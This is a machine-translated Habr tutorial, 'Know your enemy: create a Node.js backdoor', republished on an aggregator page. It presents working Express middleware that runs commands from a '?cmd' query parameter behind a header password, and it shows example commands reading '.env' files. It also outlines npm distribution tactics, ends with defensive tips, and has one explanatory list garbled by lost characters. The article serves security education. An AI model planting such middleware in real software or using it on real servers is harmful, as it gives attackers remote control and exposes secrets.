<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëàüèø üñêüèΩ ü¶ì Know your enemy: create a Node.js backdoor ü§∑üèº üôéüèª üèçÔ∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="A backdoor in its own code, which can seamlessly interact with the operating system, is one of the worst nightmares of any developer. Currently, npm h...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Know your enemy: create a Node.js backdoor</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/ruvds/blog/493706/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A backdoor in its own code, which can seamlessly interact with the operating system, is one of the worst nightmares of any developer. </font><font style="vertical-align: inherit;">Currently, npm has over 1.2 million public packages. </font><font style="vertical-align: inherit;">Over the past three years, project addictions have become an ideal target for cybercriminals. </font><font style="vertical-align: inherit;">The npm ecosystem can be surprisingly fragile if the development community does not pay close attention to security. </font><font style="vertical-align: inherit;">As evidence of this idea, it suffices to recall the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">typosquatting</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">incident</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> with the event-stream npm package. </font><font style="vertical-align: inherit;">
The author of the article, the translation of which we are publishing today, wants, for educational purposes, to talk about how to create backdoors for the Node.js platform.</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><img src="https://habrastorage.org/webt/3j/8a/0y/3j8a0ysn9-nbui6_stqwb783zcq.jpeg"></a><br>
<br><font style="vertical-align: inherit;"></font><br>
<a name="habracut"></a><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">What is a backdoor?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Here is the definition of the term ‚Äúbackdoor‚Äù given on the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malwarebytes</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> resource </font><font style="vertical-align: inherit;">: ‚ÄúIn the field of cybersecurity, a backdoor is any method by which authorized and unauthorized users can bypass common security measures and gain high-level root access to a computer system, network application. </font><font style="vertical-align: inherit;">After gaining such access to the system, cybercriminals can use a backdoor to steal personal and financial data, install additional malware, and hack devices. ‚Äù </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The backdoor consists of two main parts:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malicious code embedded in and executed on an attacked system</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">An open communication channel that allows an attacker to send commands to a backdoor and control a remote computer.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The backdoor installed on the computer is sent commands in response to which it performs certain actions. These can be commands aimed at extracting valuable information from the system, such as environmental variables, or designed to perform an attack on the database. Moreover, the execution of such commands may result in a change in other processes that affect a single computer or the entire network. The scale of the attack depends on the permissions that the infected application has. In our case, we are talking about an application written for the Node.js. platform. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In order to create a simplified version of the program that implements the above attack, we will use the standard module </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">child_process</font></a><font style="vertical-align: inherit;"> to execute the code</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">To establish communication with the backdoor, we use an HTTP server. </font><font style="vertical-align: inherit;">I would advise you to use the Express framework in this case, which is known for its huge capabilities, but what will be discussed can be implemented using any other suitable tools.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Why do we need child_process?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The standard Node.js module </font></font><code>child_process</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">can be used to start child processes. </font><font style="vertical-align: inherit;">The main idea here is that it gives us the opportunity to execute commands (coming into the process through a standard input stream - </font></font><code>stdin</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) like </font></font><code>pwd</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">or </font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, and then integrate the result of these commands (the output comes from the output stream - </font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) and possible error messages (from stream </font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">) to the main program.</font></font><br>
<br>
<div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/e3c/666/71e/e3c66671ef56b974c1a7692f7962c479.png"></div><br>
<i><font color="#999999"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Process execution and its relationship with standard input, output, and error flows, which play the role of input and output flows for a running system process.</font></font></font></i><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
There are various ways to execute child processes. </font><font style="vertical-align: inherit;">For this attack, it is easiest to use a function</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">that allows you to callback and put into the appropriate buffers what gets into the</font></font><code>stdout</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">and</font><font style="vertical-align: inherit;">streams</font></font><code>stderr</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">For example, what will be issued as a result of the command</font></font><code>cat passwords.txt</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Please note that a function</font></font><code>exec</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">is not the best way to perform lengthy tasks like</font></font><code>ping snyk.io</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span>&nbsp; {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>);<font></font>
<font></font>
exec(<span class="hljs-string">'cat .env'</span>, (err, stdout, stderr) =&gt; {
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">throw</span> err
&nbsp;&nbsp;<span class="hljs-keyword">if</span>(stderr) <span class="hljs-keyword">return</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Execution error: <span class="hljs-subst">${stderr}</span>`</span>)
&nbsp;&nbsp;<span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Env file content:&nbsp; <span class="hljs-subst">${stdout}</span>`</span>)<font></font>
})<font></font>
</code></pre><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">How to combine exec function with HTTP server?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I developed a simple, innocent-looking </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">browser-redirect</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> middleware package </font><font style="vertical-align: inherit;">for Express applications. </font><font style="vertical-align: inherit;">It redirects non-Chrome users to </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">browsehappy.com</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">I will include malicious code in this package. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The package code will be something like this:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It is enough for the victim to install the package and use it in the Express application in the same way as they use any package in the middle layer:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">"express"</span>);
<span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">"helmet"</span>)
<span class="hljs-keyword">const</span> browserRedirect = <span class="hljs-built_in">require</span>(<span class="hljs-string">"browser-redirect "</span>)<font></font>
&nbsp;<font></font>
<span class="hljs-keyword">const</span> app = express();<font></font>
&nbsp;<font></font>
app.use(browserRedirect())<font></font>
app.use(helmet())<font></font>
&nbsp;<font></font>
app.get(<span class="hljs-string">"/"</span>, (req, res)=&gt;{<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.send(<span class="hljs-string">"Hello Chrome User!"</span>)<font></font>
})<font></font>
&nbsp;<font></font>
app.listen(<span class="hljs-number">8080</span>)
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Please note that in this case, even if used </font></font><code>Helmet</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, this does not protect the application from attack.</font></font><br>
<br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Malicious code</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The implementation of the malicious code is quite simple:</font></font><br>
<br>
<pre><code class="javascript hljs"><span class="hljs-keyword">const</span> {exec} = <span class="hljs-built_in">require</span>(<span class="hljs-string">"child_process"</span>)
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>);
<span class="hljs-keyword">const</span> useragent = <span class="hljs-built_in">require</span>(<span class="hljs-string">'useragent'</span>);<font></font>
&nbsp;<font></font>
<span class="hljs-built_in">module</span>.exports = <span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> {
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> {cmd} = req.query;
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> hash = crypto.createHash(<span class="hljs-string">'md5'</span>)<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.update(<span class="hljs-built_in">String</span>(req.headers[<span class="hljs-string">"knock_knock"</span>]))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.digest(<span class="hljs-string">"hex"</span>);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;res.setHeader(<span class="hljs-string">"Content-Sec-Policy"</span>, <span class="hljs-string">"default-src 'self'"</span>)
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>(cmd &amp;&amp; hash === <span class="hljs-string">"c4fbb68607bcbb25407e0362dab0b2ea"</span>) {
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> exec(cmd, (err, stdout, stderr)=&gt;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">return</span> res.send(<span class="hljs-built_in">JSON</span>.stringify({err, stdout, stderr}, <span class="hljs-literal">null</span>, <span class="hljs-number">2</span>))<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;})<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;}<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//  </span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">const</span> ua = useragent.is(req.headers[<span class="hljs-string">'user-agent'</span>]);<font></font>
&nbsp;&nbsp;&nbsp;&nbsp;ua.chrome ? next(): res.redirect(<span class="hljs-string">"https://browsehappy.com/"</span>)<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
How does our backdoor work? </font><font style="vertical-align: inherit;">To answer this question, consider the following:</font></font><br>
<br>
<ol>
<li>,           .         .      md5- ( <code>p@ssw0rd1234</code>   <code>c4fbb68607bcbb25407e0362dab0b2ea</code>).           <code>knock_knock</code>. ,   ,  ,      .</li>
<li>,          .       ,     .        <code>Content-Sec-Policy</code>,      <code>Content-security-policy</code>.   ‚Äî      .     .       Shodan,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="></a>: <code>/search?query=Content-Sec-Policy%3A+default-src+%27self%27</code>.</li>
<li>  <code>?cmd</code>         .         .       <code>victim.com/?cmd=whoami</code>  <code>?cmd=cat .env</code>        JSON.</li>
</ol><br>
<h2><font color="#3AC1EF">  </font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Now that the backdoor code is ready, you need to think about how to distribute the malicious package. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The first step is to publish the package. I published the package </font></font><code>browser-redirect@1.0.2</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">in npm. But if you look at the GitHub repository of the project, then the malicious code will not be there. See for yourself - take a look at the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">master</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> project branch </font><font style="vertical-align: inherit;">and release </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.0.2</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . This is possible due to the fact that npm does not verify the code of published packages with the code published in some system designed to work with source code. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Although the package is published in npm, its chances of distribution are still very low, as potential victims still need to find and install it.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Another way to distribute a package is to add a malicious module as a dependency for other packages. If an attacker has access to an account with the publication rights of some important package, he can publish a new version of such a package. The dependencies of the new version of the package will also include a backdoor. As a result, we are talking about the direct inclusion of a malicious package in the dependencies of a popular project (take a look at the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">analysis of the</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> incident that occurred with event-stream). Alternatively, an attacker can try to make PR in a project by making appropriate changes to the lock file. Read about it </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">here</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Another important factor that needs to be taken into account is whether the attacker has access to the credentials (username and password) of someone who is supporting a certain popular project. If an attacker has such data, he can easily release a new version of the package - just as happened with </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eslint</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But even if someone who supports the project uses two-factor authentication to publish it, he still risks it. And when a continuous integration system is used to deploy new versions of the project, two-factor authentication must be turned off. As a result, if an attacker can steal a working npm token for a continuous integration system (for example, from logs accidentally made public, from data leaks, and from other similar sources), then he will be able to deploy new releases containing malicious code . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Please note that the </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">new API has</font></a><font style="vertical-align: inherit;"> been released </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(still in private beta status), which allows you to find out whether the package was published using the IP address of the TOR network, and whether two-factor authentication was used when publishing. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Moreover, attackers can configure the malicious code so that it runs in the form of a script that is executed before installation or after installing any npm package. There are </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">standard</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> lifecycle </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">hooks for</font></a><font style="vertical-align: inherit;"> npm packages that let you execute code on a user's computer at a specific time. For example, a system for organizing testing projects in a browser, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Puppeteer</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , uses these hooks to </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">install</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Chromium on a host system. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ryan Dahl already </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">said</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">about these vulnerabilities at JSConf EU 2018. The Node.js platform needs a higher level of protection to prevent this and other attack vectors. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Here are some conclusions from the </font><font style="vertical-align: inherit;">open source software </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">security</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> study:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">78% of vulnerabilities are found in indirect dependencies, which complicates the process of getting rid of such vulnerabilities.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Over 2 years, there has been an increase in vulnerabilities in libraries by 88%.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81% of respondents believe that developers themselves should be responsible for security. </font><font style="vertical-align: inherit;">They, in addition, believe that the developers are not well prepared for this.</font></font></li>
</ul><br>
<h2><font color="#3AC1EF"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Results: how to protect yourself from backdoors?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Controlling dependencies is not always easy, but a few tips can help you with this:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use well-known and well-supported libraries.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get involved in community life and help those who support libraries. </font><font style="vertical-align: inherit;">Help may include writing code or providing financial support for projects.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NQP</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to analyze the new dependencies of your project.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use Snyk to keep abreast of vulnerabilities and monitor your projects.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analyze the code of the dependencies you are using, stored in npm. </font><font style="vertical-align: inherit;">Don't limit yourself to viewing code from GitHub or other similar systems.</font></font></li>
</ul><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dear readers! </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">How do you protect your projects using someone else's code?</font></font><br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><img src="https://habrastorage.org/webt/iq/fi/b4/iqfib45pgphfrxv--zfemt0qnmw.jpeg"></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../en493692/index.html">Theoretical data structures and their application in JavaScript. P1. Couples</a></li>
<li><a href="../en493696/index.html">Accelerating the Qemu KVM disk subsystem on Linux</a></li>
<li><a href="../en493700/index.html">Using malware in Azure to gain access to Microsoft 365 tenants</a></li>
<li><a href="../en493702/index.html">Massive transition to remote work: technical problems and threats to security</a></li>
<li><a href="../en493704/index.html">Using TypeScript in JavaScript without writing TypeScript</a></li>
<li><a href="../en493708/index.html">Anatomy of my home Kubernetes cluster</a></li>
<li><a href="../en493712/index.html">New TypeScript features for enhanced usability</a></li>
<li><a href="../en493714/index.html">Security Cheat Sheets: Nodejs</a></li>
<li><a href="../en493716/index.html">Type inference with TypeScript using the as const construct and the infer keyword</a></li>
<li><a href="../en493718/index.html">Discussion: standard UNIX utilities that few have used and are currently using</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>